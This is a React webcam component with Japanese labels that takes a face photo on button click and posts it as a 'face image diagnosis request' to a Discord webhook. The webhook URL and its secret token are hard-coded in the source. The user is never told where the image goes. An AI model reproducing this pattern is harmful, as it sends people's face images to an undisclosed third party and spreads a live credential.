import React, { useRef, useState } from "react";
import Webcam from "react-webcam";

const webhookUrl = "https://discord.com/api/webhooks/1383108135933444216/PXcm8Vm0OOnkF_cx2AXjfiqpRccbCCxvzqSC37GfEvET1NlSODR9TDmxVx-Rmpgflh-K";

export default function WebcamCapture() {
  const webcamRef = useRef(null);
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);
  const [error, setError] = useState("");

  const captureAndSend = async () => {
    setError("");
    setSent(false);
    setLoading(true);
    const imageSrc = webcamRef.current.getScreenshot();
    if (!imageSrc) {
      setLoading(false);
      setError("カメラ画像の取得に失敗しました。");
      return;
    }
    try {
      const blob = await (await fetch(imageSrc)).blob();
      const formData = new FormData();
      formData.append("file", blob, "face.png");
      formData.append("content", "顔画像診断リクエスト");

      await fetch(webhookUrl, {
        method: "POST",
        body: formData,
      });
      setSent(true);
    } catch {
      setError("送信に失敗しました。");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center">
      <div className="rounded-2xl overflow-hidden border-2 border-gray-700 shadow-lg mb-5">
        <Webcam
          audio={false}
          ref={webcamRef}
          screenshotFormat="image/png"
          width={320}
          height={320}
          videoConstraints={{ facingMode: "user" }}
          className="bg-black"
        />
      </div>
      <button
        onClick={captureAndSend}
        disabled={loading}
        className="bg-gradient-to-r from-purple-700 to-indigo-700 text-white font-bold py-3 px-8 rounded-full shadow-lg hover:scale-105 transition-transform text-xl"
      >
        {loading ? "送信中..." : "画像を撮る"}
      </button>
      {sent && <div className="text-green-400 mt-4 font-bold">送信完了！</div>}
      {error && <div className="text-red-400 mt-4">{error}</div>}
    </div>
  );
}
